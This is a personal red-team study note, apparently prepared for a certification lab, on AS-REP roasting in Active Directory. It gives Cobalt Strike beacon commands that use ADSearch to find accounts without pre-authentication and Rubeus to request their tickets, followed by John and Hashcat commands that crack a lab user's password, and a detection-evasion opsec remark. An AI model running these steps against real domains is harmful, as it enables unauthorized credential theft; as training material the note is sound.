
If a user does not have [[Kerberos]] pre-authentication enabled, an AS-REP can be requested for that user, and part of the reply can be cracked offline to recover their plaintext password.  

This configuration is enabled on the User Object and is often seen on accounts that are associated with Linux systems.

![[preauth.png]]

## 🖊️ via Cobalt Strike

As with [[Kerberoasting]], we don't want to asreproast every account in the domain.

1) Search for a user with no pre-auth

```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
```

2) Request the [[Ticket Granting Ticket (TGT)]] for the account

`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap`

3) Use `--format=krb5asrep --wordlist=wordlist squid_svc` for [[JohnTheRipper]] or `-a 0 -m 18200 squid_svc wordlist` for [[Hashcat]].

```
$ john --format=krb5asrep --wordlist=wordlist squid_svc
Passw0rd!        ($krb5asrep$squid_svc@dev.cyberbotic.io)
```


### ⚠ Opsec

ASREPRoasting with will generate a 4768 event with RC4 encryption and a preauth type of 0.


### Properties
---
📆 created   {{18-02-2024}} 18:56
🏷️ tags: #redteam #crto 

---

